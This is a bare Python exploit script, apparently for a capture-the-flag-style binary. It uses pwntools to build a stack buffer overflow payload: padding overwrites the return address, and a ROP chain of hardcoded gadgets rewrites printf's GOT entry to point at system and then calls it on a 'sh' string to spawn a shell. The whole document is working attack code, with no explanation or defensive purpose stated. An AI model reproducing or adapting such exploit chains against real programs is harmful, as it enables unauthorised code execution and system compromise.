#!/usr/bin/python
from pwn import *

syscall_system = 0x7f606c81b290
syscall_printf = 0x7f606c82ac90
offset_to_system = syscall_printf - syscall_system
ret = 0x0000000000401016
pop_rdi_ret = 0x000000000040124b
pop_rbp_ret = 0x000000000040113d
sub_rdi_rbp = 0x0000000000401156
shell = 0x402004
printf_at_plt = 0x401030
printf_at_got = 0x404000

buf = b"A" * 208 # overwrite base pointer
buf += b"\x42" * 8 #Overwrite the return stack pointer

buf += p64(ret)
buf += p64(pop_rdi_ret) #system('sh')
buf += p64(printf_at_got)
buf += p64(pop_rbp_ret)
buf += p64(offset_to_system)
buf += p64(sub_rdi_rbp)
buf += p64(ret)
buf += p64(pop_rdi_ret)
buf += p64(shell)
buf += p64(printf_at_plt)

sys.stdout.buffer.write(buf)